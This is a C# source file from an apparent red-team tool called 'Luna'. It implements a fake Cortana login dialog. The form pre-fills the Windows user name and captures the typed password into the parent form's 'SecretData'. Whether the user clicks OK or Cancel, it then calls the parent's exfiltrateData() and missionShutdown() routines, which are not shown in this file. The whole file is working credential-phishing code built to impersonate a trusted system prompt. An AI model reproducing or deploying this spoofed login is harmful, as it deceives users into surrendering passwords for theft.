//Copyright(C) 2016-2018  saintcrossbow@gmail.com

//This program is free software: you can redistribute it and/or modify
//it under the terms of the GNU General Public License as published by
//the Free Software Foundation, either version 3 of the License, or
//(at your option) any later version.

//This program is distributed in the hope that it will be useful,
//but WITHOUT ANY WARRANTY; without even the implied warranty of
//MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.See the
//GNU General Public License for more details.

//You should have received a copy of the GNU General Public License
//along with this program.If not, see<http://www.gnu.org/licenses/>

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace Luna
{
    public partial class loginCortana : Form
    {
        string _userID;
        string _password;
        private missionRun _frmParent;

        public string userID
        {
            set
            {
                _userID = value;
                this.txtUser.Text = _userID;
            }

            get { return _userID; }
        }

        public string password
        {
            set
            {
                _password = value;
                this.txtPassword.Text = _password;
                _frmParent.SecretData = _password;
            }

            get { return _password; }
        }

        public loginCortana(missionRun frmParent)
        {
            _frmParent = frmParent;
            _userID = Environment.UserName;
            this.AcceptButton = btnOK;
            this.CancelButton = btnCancel;
            InitializeComponent();
        }

        private void loginCortana_Activated(object sender, EventArgs e)
        {
            this.txtPassword.Focus();
        }

        private void loginCortana_Validated(object sender, EventArgs e)
        {
            this.password = txtPassword.Text;
        }

        // Excellent stackoverflow solution to an annoying problem:
        // https://stackoverflow.com/questions/25012924/accept-button-doesnt-work
        protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
        {
            if (keyData == Keys.Enter)
            {
                btnOK.PerformClick();
                return true;
            }
            return base.ProcessCmdKey(ref msg, keyData);
        }

        private void btnOK_Click(object sender, EventArgs e)
        {
            missionComplete();
        }

        private void btnCancel_Click(object sender, EventArgs e)
        {
            missionComplete();
        }

        private void missionComplete()
        {
            this.Visible = false;
            _frmParent.Refresh();
            Application.DoEvents();
            _frmParent.exfiltrateData();
            _frmParent.missionShutdown();
        }

        private void txtPassword_Validated(object sender, EventArgs e)
        {
            this.password = txtPassword.Text;
        }
    }
}
